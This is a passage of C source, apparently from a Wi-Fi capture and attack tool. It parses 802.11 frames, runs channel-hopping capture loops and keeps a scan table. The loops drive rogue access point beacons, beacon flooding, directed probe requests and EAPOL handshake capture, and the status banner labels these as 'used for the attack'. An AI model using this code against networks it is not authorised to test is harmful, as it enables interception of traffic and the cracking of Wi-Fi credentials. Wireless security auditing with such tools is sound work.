if((rthp & IEEE80211_RADIOTAP_FHSS) == IEEE80211_RADIOTAP_FHSS)
	{
	if((pf %2) != 0) pf += 1;
	pf += 2;
	}
if((rthp & IEEE80211_RADIOTAP_DBM_ANTSIGNAL) == IEEE80211_RADIOTAP_DBM_ANTSIGNAL)
	{
	if(pf > rthlen) return pfc;
	rssi = packetptr[pf];
	}
return pfc;
}
/*===========================================================================*/
static inline void process_packet()
{
static int rthl;
static uint32_t rthp;
static authf_t *auth;

packetlen = recvfrom(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN, 0, NULL, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
if(packetlen == 0)
	{
	fprintf(stderr, "\ninterface went down\n");
	globalclose();
	}
#ifdef DEBUG
debugprint(packetlen, &epb[EPB_SIZE], NULL);
#endif
if(packetlen < 0)
	{
	perror("\nfailed to read packet");
	errorcount++;
	return;
	}
if(packetlen < (int)RTH_SIZE)
	{
	fprintf(stderr, "\ngot damged radiotap header\n");
	radiotaperrorcount++;
	errorcount++;
	return;
	}
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if((rth->it_version != 0) || (rth->it_pad != 0) || (rth->it_present == 0))
	{
	radiotaperrorcount++;
	errorcount++;
	return;
	}
rthp = le32toh(rth->it_present);
if((rthp & IEEE80211_RADIOTAP_TX_FLAGS) == IEEE80211_RADIOTAP_TX_FLAGS) return;
rthl = le16toh(rth->it_len);
if(rthl > packetlen)
	{
	radiotaperrorcount++;
	errorcount++;
	return;
	}
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
ieee82011len -= getradiotapfield(rthl, rthp);
if(ieee82011len < MAC_SIZE_ACK) return;
incomingcount++;
tvlast_sec = tv.tv_sec;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON)
		{
		process80211beacon();
		if(beaconfloodflag == true) send_beacon_active();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ)
		{
		if(memcmp(&mac_broadcast, macfrx->addr1, 6) == 0) process80211probe_req();
		else if(memcmp(&mac_myaphidden, macfrx->addr1, 6) == 0) return;
		else if(memcmp(&mac_null, macfrx->addr1, 6) == 0) process80211probe_req();
		else process80211probe_req_directed();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_AUTH)
		{
		auth = (authf_t*)payloadptr;
		if(auth->algorithm == SAE) process80211authentication_sae();
		else if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0) process80211authentication_req();
		else if(memcmp(macfrx->addr2, macfrx->addr3, 6) == 0) process80211authentication_resp();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ) process80211association_req();
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) process80211association_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ) process80211reassociation_req();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) process80211reassociation_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_ACTION) process80211action();
	else if(macfrx->subtype == IEEE80211_STYPE_DEAUTH) process80211deauth();
	}
else if(macfrx->type == IEEE80211_FTYPE_CTL)
	{
	if(macfrx->subtype == IEEE80211_STYPE_ACK) process80211ack();
	else if(macfrx->subtype == IEEE80211_STYPE_RTS) process80211rts();
	else if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211powersave_poll();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK_REQ) process80211blockack_req();
	}
else if(macfrx->type == IEEE80211_FTYPE_DATA)
	{
	if((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC)
		{
		if(((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) || ((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)) process80211null();
		}
	else if((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC)
		{
		if(((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) || ((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)) process80211qosnull();
		return;
		}
	qosflag = false;
	if((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
		{
		qosflag = true;
		payloadptr += QOS_SIZE;
		payloadlen -= QOS_SIZE;
		}
	if(payloadlen < LLC_SIZE) return;
	llcptr = payloadptr;
	llc = (llc_t*)llcptr;
	if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP)) process80211eap();
	else if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		if((pcapngframesout &PCAPNG_FRAME_IPV4) == PCAPNG_FRAME_IPV4)
			{
			if(fd_pcapng <= 0) return;
			if((pcapngframesout &PCAPNG_FRAME_IPV4) != PCAPNG_FRAME_IPV4) return;
			writeepb(fd_pcapng);
			}
		}
	else if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		if((pcapngframesout &PCAPNG_FRAME_IPV6) == PCAPNG_FRAME_IPV6)
			{
			if(fd_pcapng <= 0) return;
			if((pcapngframesout &PCAPNG_FRAME_IPV6) != PCAPNG_FRAME_IPV6) return;
			writeepb(fd_pcapng);
			}
		}
	else if(macfrx->prot ==1)
		{
		mpduptr = payloadptr;
		mpdu = (mpdu_t*)mpduptr;
		if(((mpdu->keyid >> 5) &1) == 1) process80211data_wpa();
		else if(((mpdu->keyid >> 5) &1) == 0) process80211data_wep();
		}
	}
return;
}
/*===========================================================================*/
static inline void process_no_cm_fd()
{
static int sd;
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static const char *fimtempl;
static const char *fimtemplprotect = "protect";
static const char *fimtemplattack = "attack";
static const char *fimtemplunused = "unused";

attackstatus = SILENT;
fimtempl = fimtemplunused;
if(filtermode == 1) fimtempl = fimtemplprotect;
if(filtermode == 2) fimtempl = fimtemplattack;
if(phyinterfacename[0] == 0) memcpy(&phyinterfacename, notavailablestr, 3);
if(nmeasentence[0] == 0) memcpy(&nmeasentence, &notavailablestr, 3);
snprintf(servermsg, SERVERMSG_MAX, "\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"NMEA 0183 SENTENCE........: %s\n"
	"PHYSICAL INTERFACE........: %s\n"
	"INTERFACE NAME............: %s\n"
	"INTERFACE PROTOCOL........: %s\n"
	"INTERFACE TX POWER........: %d dBm (lowest value reported by the device)\n"
	"INTERFACE HARDWARE MAC....: %02x%02x%02x%02x%02x%02x (not used for the attack)\n"
	"INTERFACE VIRTUAL MAC.....: %02x%02x%02x%02x%02x%02x (not used for the attack)\n"
	"DRIVER....................: %s\n"
	"DRIVER VERSION............: %s\n"
	"DRIVER FIRMWARE VERSION...: %s\n"
	"openSSL version...........: %d.%d\n"
	"ERRORMAX..................: %d errors\n"
	"BPF code blocks...........: %" PRIu16 "\n"
	"FILTERLIST ACCESS POINT...: %d entries\n"
	"FILTERLIST CLIENT.........: %d entries\n"
	"FILTERMODE................: %s\n"
	"WEAK CANDIDATE............: %s\n"
	"ESSID list................: %d entries\n"
	"ACCESS POINT (ROGUE)......: %02x%02x%02x%02x%02x%02x (BROADCAST WILDCARD used for the attack)\n"
	"ACCESS POINT (ROGUE)......: %02x%02x%02x%02x%02x%02x (BROADCAST OPEN used for the attack)\n"
	"ACCESS POINT (ROGUE)......: %02x%02x%02x%02x%02x%02x (used for the attack and incremented on every new client)\n"
	"CLIENT (ROGUE)............: %02x%02x%02x%02x%02x%02x\n"
	"EAPOLTIMEOUT..............: %" PRIu64 " usec\n"
	"EAPOLEAPTIMEOUT...........: %" PRIu64 " usec\n"
	"REPLAYCOUNT...............: %" PRIu64 "\n"
	"ANONCE....................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"SNONCE....................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"\n"
	"TIME     FREQ/CH  MAC_DEST     MAC_SOURCE   ESSID [FRAME TYPE]\n",
	nmeasentence, phyinterfacename, interfacename, interfaceprotocol, interfacetxpwr,
	mac_orig[0], mac_orig[1], mac_orig[2], mac_orig[3], mac_orig[4], mac_orig[5],
	mac_virt[0], mac_virt[1], mac_virt[2], mac_virt[3], mac_virt[4], mac_virt[5],
	drivername, driverversion, driverfwversion,
	opensslversionmajor, opensslversionminor,
	maxerrorcount, bpf.len, filteraplistentries, filterclientlistentries, fimtempl, weakcandidate,
	beaconextlistlen,
	mac_myaphidden[0], mac_myaphidden[1], mac_myaphidden[2], mac_myaphidden[3], mac_myaphidden[4], mac_myaphidden[5],
	mac_myapopen[0], mac_myapopen[1], mac_myapopen[2], mac_myapopen[3], mac_myapopen[4], mac_myapopen[5],
	mac_myap[0], mac_myap[1], mac_myap[2], mac_myap[3], mac_myap[4], mac_myap[5],
	mac_myclient[0], mac_myclient[1], mac_myclient[2], mac_myclient[3], mac_myclient[4], mac_myclient[5],
	eapoltimeoutvalue, eapoleaptimeoutvalue, myrc,
	myanonce[0], myanonce[1], myanonce[2], myanonce[3], myanonce[4], myanonce[5], myanonce[6], myanonce[7],
	myanonce[8], myanonce[9], myanonce[10], myanonce[11], myanonce[12], myanonce[13], myanonce[14], myanonce[15],
	myanonce[16], myanonce[17], myanonce[18], myanonce[19], myanonce[20], myanonce[21], myanonce[22], myanonce[23],
	myanonce[24], myanonce[25], myanonce[26], myanonce[27], myanonce[28], myanonce[29], myanonce[30], myanonce[31],
	mysnonce[0], mysnonce[1], mysnonce[2], mysnonce[3], mysnonce[4], mysnonce[5], mysnonce[6], mysnonce[7],
	mysnonce[8], mysnonce[9], mysnonce[10], mysnonce[11], mysnonce[12], mysnonce[13], mysnonce[14], mysnonce[15],
	mysnonce[16], mysnonce[17], mysnonce[18], mysnonce[19], mysnonce[20], mysnonce[21], mysnonce[22], mysnonce[23],
	mysnonce[24], mysnonce[25], mysnonce[26], mysnonce[27], mysnonce[28], mysnonce[29], mysnonce[30], mysnonce[31]);

if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
gettimeofday(&tv, NULL);
tsfd.tv_sec = 0;
tsfd.tv_nsec = FDNSECTIMERB;
while(wantstopflag == false)
	{
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		if(forceinterfaceflag == false) globalclose();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %gpiostatusledflashinterval) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if((tv.tv_sec -tvlast_sec) > WATCHDOG)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					printreceivewatchdogwarnung();
					}
				}
			}
		if((tv.tv_sec %60) == 0)
			{
			if(((statusout &STATUS_GPS) == STATUS_GPS) && (fd_gps > 0)) printposition();
			if((statusout &STATUS_INTERNAL) == STATUS_INTERNAL) printtimestatus();
			}
		}
	if(reloadfilesflag == true) loadfiles();
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	if(fd_socket_srv > 0)
		{
		FD_SET(fd_socket_srv, &readfds);
		sd = fd_socket_srv;
		}
	tsfd.tv_sec = 0;
	tsfd.tv_nsec = FDNSECTIMERB;
	fdnum = pselect(sd +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	get_channel_no_cm();
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet();
	else if(FD_ISSET(fd_socket_srv, &readfds)) process_packet_client();
	}
globalclose();
return;
}
/*===========================================================================*/
static inline void process_fd()
{
static int sd;
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static const char *fimtempl;
static const char *fimtemplprotect = "protect";
static const char *fimtemplattack = "attack";
static const char *fimtemplunused = "unused";

fimtempl = fimtemplunused;
if(filtermode == 1) fimtempl = fimtemplprotect;
if(filtermode == 2) fimtempl = fimtemplattack;
if(phyinterfacename[0] == 0) memcpy(&phyinterfacename, notavailablestr, 3);
if(nmeasentence[0] == 0) memcpy(&nmeasentence, &notavailablestr, 3);
snprintf(servermsg, SERVERMSG_MAX, "\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"NMEA 0183 PROTOCOL........: %s\n"
	"PHYSICAL INTERFACE........: %s\n"
	"INTERFACE NAME............: %s\n"
	"INTERFACE PROTOCOL........: %s\n"
	"INTERFACE TX POWER........: %d dBm (lowest value reported by the device)\n"
	"INTERFACE HARDWARE MAC....: %02x%02x%02x%02x%02x%02x (not used for the attack)\n"
	"INTERFACE VIRTUAL MAC.....: %02x%02x%02x%02x%02x%02x (not used for the attack)\n"
	"DRIVER....................: %s\n"
	"DRIVER VERSION............: %s\n"
	"DRIVER FIRMWARE VERSION...: %s\n"
	"openSSL version...........: %d.%d\n"
	"ERRORMAX..................: %d errors\n"
	"BPF code blocks...........: %" PRIu16 "\n"
	"FILTERLIST ACCESS POINT...: %d entries\n"
	"FILTERLIST CLIENT.........: %d entries\n"
	"FILTERMODE................: %s\n"
	"WEAK CANDIDATE............: %s\n"
	"ESSID list................: %d entries\n"
	"ACCESS POINT (ROGUE)......: %02x%02x%02x%02x%02x%02x (BROADCAST WILDCARD used for the attack)\n"
	"ACCESS POINT (ROGUE)......: %02x%02x%02x%02x%02x%02x (BROADCAST OPEN used for the attack)\n"
	"ACCESS POINT (ROGUE)......: %02x%02x%02x%02x%02x%02x (used for the attack and incremented on every new client)\n"
	"CLIENT (ROGUE)............: %02x%02x%02x%02x%02x%02x\n"
	"EAPOLTIMEOUT..............: %" PRIu64 " usec\n"
	"EAPOLEAPTIMEOUT...........: %" PRIu64 " usec\n"
	"REPLAYCOUNT...............: %" PRIu64 "\n"
	"ANONCE....................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"SNONCE....................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"\n"
	"TIME     FREQ/CH  MAC_DEST     MAC_SOURCE   ESSID [FRAME TYPE]\n",
	nmeasentence, phyinterfacename, interfacename, interfaceprotocol, interfacetxpwr,
	mac_orig[0], mac_orig[1], mac_orig[2], mac_orig[3], mac_orig[4], mac_orig[5],
	mac_virt[0], mac_virt[1], mac_virt[2], mac_virt[3], mac_virt[4], mac_virt[5],
	drivername, driverversion, driverfwversion,
	opensslversionmajor, opensslversionminor,
	maxerrorcount, bpf.len, filteraplistentries, filterclientlistentries, fimtempl, weakcandidate,
	beaconextlistlen,
	mac_myaphidden[0], mac_myaphidden[1], mac_myaphidden[2], mac_myaphidden[3], mac_myaphidden[4], mac_myaphidden[5],
	mac_myapopen[0], mac_myapopen[1], mac_myapopen[2], mac_myapopen[3], mac_myapopen[4], mac_myapopen[5],
	mac_myap[0], mac_myap[1], mac_myap[2], mac_myap[3], mac_myap[4], mac_myap[5],
	mac_myclient[0], mac_myclient[1], mac_myclient[2], mac_myclient[3], mac_myclient[4], mac_myclient[5],
	eapoltimeoutvalue, eapoleaptimeoutvalue, myrc,
	myanonce[0], myanonce[1], myanonce[2], myanonce[3], myanonce[4], myanonce[5], myanonce[6], myanonce[7],
	myanonce[8], myanonce[9], myanonce[10], myanonce[11], myanonce[12], myanonce[13], myanonce[14], myanonce[15],
	myanonce[16], myanonce[17], myanonce[18], myanonce[19], myanonce[20], myanonce[21], myanonce[22], myanonce[23],
	myanonce[24], myanonce[25], myanonce[26], myanonce[27], myanonce[28], myanonce[29], myanonce[30], myanonce[31],
	mysnonce[0], mysnonce[1], mysnonce[2], mysnonce[3], mysnonce[4], mysnonce[5], mysnonce[6], mysnonce[7],
	mysnonce[8], mysnonce[9], mysnonce[10], mysnonce[11], mysnonce[12], mysnonce[13], mysnonce[14], mysnonce[15],
	mysnonce[16], mysnonce[17], mysnonce[18], mysnonce[19], mysnonce[20], mysnonce[21], mysnonce[22], mysnonce[23],
	mysnonce[24], mysnonce[25], mysnonce[26], mysnonce[27], mysnonce[28], mysnonce[29], mysnonce[30], mysnonce[31]);

if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
gettimeofday(&tv, NULL);
tsfd.tv_sec = 0;
tsfd.tv_nsec = FDNSECTIMERB;
ptrfscanlist = fscanlist;
if(set_channel() == false) errorcount++;
if(beaconactiveflag == true)
	{
	send_beacon_open();
	send_beacon_hidden();
	}
if(rgbeaconlist->timestamp != 0) send_beacon_list_active();
while(wantstopflag == false)
	{
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		if(forceinterfaceflag == false) globalclose();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		get_channel();
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %gpiostatusledflashinterval) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if((tv.tv_sec -tvlast_sec) > WATCHDOG)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					printreceivewatchdogwarnung();
					}
				}
			}
		if((tv.tv_sec %staytime) == 0)
			{
			ptrfscanlist++;
			if(ptrfscanlist->frequency == 0) ptrfscanlist = fscanlist;
			if(set_channel() == false)
				{
				errorcount++;
				continue;
				}
			packetsentflag = false;
			if(beaconactiveflag == true)
				{
				send_beacon_active();
				send_beacon_open();
				send_beacon_hidden();
				}
			if(rgbeaconlist->timestamp != 0) send_beacon_list_active();
			}
		if((tv.tv_sec %60) == 0)
			{
			if(((statusout &STATUS_GPS) == STATUS_GPS) && (fd_gps > 0)) printposition();
			if((statusout &STATUS_INTERNAL) == STATUS_INTERNAL) printtimestatus();
			}
		}
	if(reloadfilesflag == true) loadfiles();
	if((packetsentflag == true) && ((tv.tv_usec -tvpacketsent.tv_usec) > PACKET_RESEND_TIMER_USEC)) resend_packet();
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	if(fd_socket_srv > 0)
		{
		FD_SET(fd_socket_srv, &readfds);
		sd = fd_socket_srv;
		}
	tsfd.tv_sec = 0;
	tsfd.tv_nsec = FDNSECTIMERB;
	fdnum = pselect(sd +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet();
	else if(FD_ISSET(fd_socket_srv, &readfds)) process_packet_client();
	else
		{
		if(beaconactiveflag == true) send_beacon_active();
		if(rgbeaconlist->timestamp != 0) send_beacon_list_active();
		}
	}
globalclose();
return;
}
/*===========================================================================*/
static inline void printrcascan()
{
static scanlist_t *zeiger;
static char timestring[16];

if(rcaorder == RCA_SORT_BY_HIT) qsort(scanlist, scanlistmax, SCANLIST_SIZE, sort_scanlist_by_hit);
else if(rcaorder == RCA_SORT_BY_COUNT) qsort(scanlist, scanlistmax, SCANLIST_SIZE, sort_scanlist_by_beacon);
else if(rcaorder == RCA_SORT_BY_CHANNEL) qsort(scanlist, scanlistmax, SCANLIST_SIZE, sort_scanlist_by_channel);
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
fprintf(stdout, "\033[2J\033[0;0H BSSID        FREQ   CH RSSI BEACON RESPONSE ESSID  SCAN-FREQ: %4d INJECTION-RATIO: %3d%% [%s]\n"
	"-----------------------------------------------------------------------------------------------------\n",
	ptrfscanlist->frequency, injectionratio, timestring);
for(zeiger = scanlist; zeiger < scanlist +scanlistmax; zeiger++)
	{
	if(zeiger->count == 0) return;
	injectionhit += zeiger->hit;
	injectioncount += zeiger->beacon;
	if((injectionhit > 0) && (injectioncount > 0))
		{
		injectionratio = (injectionhit *100) /injectioncount;
		if(injectionratio > 100) injectionratio = 100;
		}
	if(zeiger->channel != 0) fprintf(stdout, " %02x%02x%02x%02x%02x%02x %4d  %3d %4d %6d   %6d %s\n",
					zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
					zeiger->frequency, zeiger->channel, zeiger->rssi, zeiger->beacon, zeiger->hit, zeiger->essid);
	}
return;
}
/*===========================================================================*/
static inline void process80211probe_resp_rca_scan()
{
static int apinfolen;
static uint8_t *apinfoptr;
static scanlist_t *zeiger;
static tags_t tags;

if(targetscanflag == true)
	{
	if(memcmp(&lastap, macfrx->addr2, 6) != 0) return;
	}
if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX -1; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	gettags(apinfolen, apinfoptr, &tags);
	if(tags.channel == ptrfscanlist->channel)
		{
		zeiger->frequency = ptrfscanlist->frequency;
		zeiger->channel = tags.channel;
		}
	else if(tags.channel == 0)
		{
		zeiger->frequency = ptrfscanlist->frequency;
		zeiger->channel = ptrfscanlist->channel;
		}
	zeiger->timestamp = timestamp;
	zeiger->count +=1;
	zeiger->proberesponse +=1;
	zeiger->rssi = rssi;
	zeiger->essidlen = tags.essidlen;
	memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
	if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0)
		{
		zeiger->hit += 1;
		responsehit++;
		}
	return;
	}
memset(zeiger, 0, SCANLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
if(tags.channel == ptrfscanlist->channel)
	{
	zeiger->frequency = ptrfscanlist->frequency;
	zeiger->channel = tags.channel;
	}
else if(tags.channel == 0)
		{
		zeiger->frequency = ptrfscanlist->frequency;
		zeiger->channel = ptrfscanlist->channel;
		}
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->proberesponse =1;
zeiger->rssi = rssi;
memcpy(zeiger->ap, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0)
	{
	zeiger->hit += 1;
	responsehit++;
	}
qsort(scanlist, zeiger -scanlist, SCANLIST_SIZE, sort_scanlist_by_hit);
return;
}
/*===========================================================================*/
static inline void process80211beacon_rca_scan()
{
static int apinfolen;
static uint8_t *apinfoptr;
static scanlist_t *zeiger;
static tags_t tags;

if(targetscanflag == true)
	{
	if(memcmp(&lastap, macfrx->addr2, 6) != 0) return;
	}
if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX -1; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	gettags(apinfolen, apinfoptr, &tags);
	if(tags.channel == ptrfscanlist->channel)
		{
		zeiger->frequency = ptrfscanlist->frequency;
		zeiger->channel = tags.channel;
		}
	else if(tags.channel == 0)
		{
		zeiger->frequency = ptrfscanlist->frequency;
		zeiger->channel = ptrfscanlist->channel;
		}
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	zeiger->beacon += 1;
	zeiger->rssi = rssi;
	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
		{
		if((zeiger->beacon %10) == 0)
			{
			zeiger->proberequest +=1;
			send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
			}
		}
	return;
	}
memset(zeiger, 0, SCANLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
if(tags.channel == ptrfscanlist->channel)
	{
	zeiger->frequency = ptrfscanlist->frequency;
	zeiger->channel = tags.channel;
	}
else if(tags.channel == 0)
	{
	zeiger->frequency = ptrfscanlist->frequency;
	zeiger->channel = ptrfscanlist->channel;
	}
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->beacon = 1;
zeiger->rssi = rssi;
memcpy(zeiger->ap, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
	{
	zeiger->proberequest +=1;
	send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
	}
qsort(scanlist, zeiger -scanlist, SCANLIST_SIZE, sort_scanlist_by_hit);
return;
}
/*===========================================================================*/
static inline void process_packet_rca()
{
static int rthl;
static uint32_t rthp;

packetlen = read(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN);
if(packetlen == 0)
	{
	fprintf(stderr, "\ninterface went down\n");
	globalclose();
	}
#ifdef DEBUG
debugprint(packetlen, &epb[EPB_SIZE], NULL);
#endif
if(packetlen < 0)
	{
	perror("\nfailed to read packet");
	errorcount++;
	return;
	}
if(packetlen < (int)RTH_SIZE)
	{
	fprintf(stderr, "\ngot damged radiotap header\n");
	radiotaperrorcount++;
	errorcount++;
	return;
	}
if(ioctl(fd_socket, SIOCGSTAMP, &tv) < 0)
	{
	perror("\nfailed to get time stamp");
	errorcount++;
	return;
	}
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if((rth->it_version != 0) || (rth->it_pad != 0) || (rth->it_present == 0))
	{
	radiotaperrorcount++;
	errorcount++;
	return;
	}
rthp = le32toh(rth->it_present);
if((rthp & IEEE80211_RADIOTAP_TX_FLAGS) == IEEE80211_RADIOTAP_TX_FLAGS) return;
rthl = le16toh(rth->it_len);
if(rthl > packetlen)
	{
	radiotaperrorcount++;
	errorcount++;
	return;
	}
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
ieee82011len -= getradiotapfield(rthl, rthp);
if(ieee82011len < MAC_SIZE_ACK) return;
incomingcount++;
tvlast_sec = tv.tv_sec;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon_rca_scan();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp_rca_scan();
	}
if(fd_pcapng > 0) writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process_fd_rca()
{
static uint64_t incomingcountold;
static int sd;
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;

gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tsfd.tv_sec = 0;
tsfd.tv_nsec = FDNSECTIMER;
if(set_channel() == false) errorcount++;
